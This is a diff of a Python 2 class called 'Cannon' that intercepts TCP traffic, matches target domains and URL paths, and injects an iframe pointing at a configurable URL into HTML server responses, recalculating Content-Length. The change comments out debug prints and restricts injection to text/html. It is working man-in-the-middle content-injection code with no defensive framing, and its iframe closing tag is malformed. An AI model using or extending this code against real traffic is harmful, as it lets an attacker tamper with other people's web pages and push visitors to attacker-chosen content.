@@ -47,10 +47,8 @@ class Cannon(object):
             # * get domain and url path
             domain = tcpContent[tcpContent.find("Host: ")+6 : tcpContent.find("\r\n", tcpContent.find("Host: "))]
             url = tcpContent[tcpContent.find("GET ")+4 : tcpContent.find("HTTP", tcpContent.find("GET "))-1]
-            print "domain: " + domain + "  length: " + str(len(domain))
-            print "url: " + url + "  length: " + str(len(url))
-
-
+            # print "domain: " + domain + "  length: " + str(len(domain))
+            # print "url: " + url + "  length: " + str(len(url))
 
             domainMatch = bool(self.target_domain_re.search(domain))
             pathMatch = bool(self.url_path_re.search(url))
@@ -89,10 +87,10 @@ class Cannon(object):
         # ! the current request is always represented by the req tuple 
         if (self.connMap[req]['role'] == 'server') & self.connMap[req]['target']:
             # * do not modify unless content-type is text/html and replace content-length if exists
-            if ("Content-Length: " in tcpContent):
+            if ("Content-Length: " in tcpContent) & ("Content-Type: text/html" in tcpContent):
                 start = tcpContent.find("Content-Length: ") + len("Content-Length: ")
                 end = tcpContent.find("\r\n", start)
-                print "length: " + tcpContent[start:end]
+                # print "length: " + tcpContent[start:end]
                 
                 oldLen = int(tcpContent[start:end])
                 newLen = oldLen + len('<iframe src="' + self.iframe_url + '"><\iframe>')
